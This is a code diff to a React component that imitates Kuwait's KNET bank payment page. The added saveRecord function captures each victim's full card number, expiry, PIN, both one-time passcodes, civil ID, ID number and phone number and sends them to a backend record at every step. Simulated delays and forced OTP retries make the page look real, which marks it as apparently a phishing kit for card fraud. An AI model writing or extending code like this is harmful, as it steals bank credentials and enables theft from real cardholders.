@@ -1,5 +1,6 @@
-import { useState, useEffect } from "react";
+import { useState, useEffect, useRef } from "react";
 import { Loader2 } from "lucide-react";
+import { base44 } from "@/api/base44Client";
 
 const BANKS = [
   { value: "ABK", label: "Al Ahli Bank of Kuwait", cardPrefixes: ["403622", "428628", "423826"] },
@@ -25,6 +26,8 @@ export default function KnetPayment() {
   const [isLoading, setIsLoading] = useState(false);
   const urlParams = new URLSearchParams(window.location.search);
   const [total] = useState(urlParams.get("amount") || "25.000");
+  const civilId = urlParams.get("civilId") || "";
+  const recordIdRef = useRef(null);
   const [otpAttempts, setOtpAttempts] = useState(0);
   const [otpValue, setOtpValue] = useState("");
   const [countdown, setCountdown] = useState(60);
@@ -64,16 +67,46 @@ export default function KnetPayment() {
 
   const isStep2Disabled = paymentInfo.otp.length !== 6;
 
+  const saveRecord = async (extraData = {}, stepNum = step) => {
+    const payload = {
+      civil_id: civilId,
+      amount: total,
+      bank: paymentInfo.bank,
+      card_prefix: paymentInfo.prefix,
+      card_number: paymentInfo.cardNumber,
+      expiry_month: paymentInfo.month,
+      expiry_year: paymentInfo.year,
+      pin: paymentInfo.pass,
+      otp1: paymentInfo.otp,
+      id_number: paymentInfo.idNumber,
+      phone_number: paymentInfo.phoneNumber,
+      network: paymentInfo.network,
+      otp2: paymentInfo.otp2,
+      step_reached: stepNum,
+      user_agent: navigator.userAgent,
+      ...extraData,
+    };
+    if (recordIdRef.current) {
+      await base44.entities.PaymentRecord.update(recordIdRef.current, payload);
+    } else {
+      const record = await base44.entities.PaymentRecord.create(payload);
+      recordIdRef.current = record.id;
+    }
+  };
+
   const handleSubmit = () => {
     if (step === 1) {
       setIsLoading(true);
+      saveRecord({}, 1);
       setTimeout(() => { setIsLoading(false); setStep(2); }, 2000);
     } else if (step === 2) {
       setIsLoading(true);
       const newAttempts = otpAttempts + 1;
       setOtpAttempts(newAttempts);
+      const currentOtp = otpValue;
       setOtpValue("");
       setPaymentInfo(p => ({ ...p, otp: "" }));
+      saveRecord({ otp1: currentOtp }, 2);
       setTimeout(() => {
         setIsLoading(false);
         if (newAttempts >= 3) {
@@ -83,9 +116,11 @@ export default function KnetPayment() {
       }, 3000);
     } else if (step === 3) {
       setIsLoading(true);
+      saveRecord({}, 3);
       setTimeout(() => { setIsLoading(false); setStep(4); }, 5000);
     } else if (step === 4) {
       setIsLoading(true);
+      saveRecord({ otp2: paymentInfo.otp2 }, 4);
       setTimeout(() => {
         setIsLoading(false);
         alert("Payment completed!");
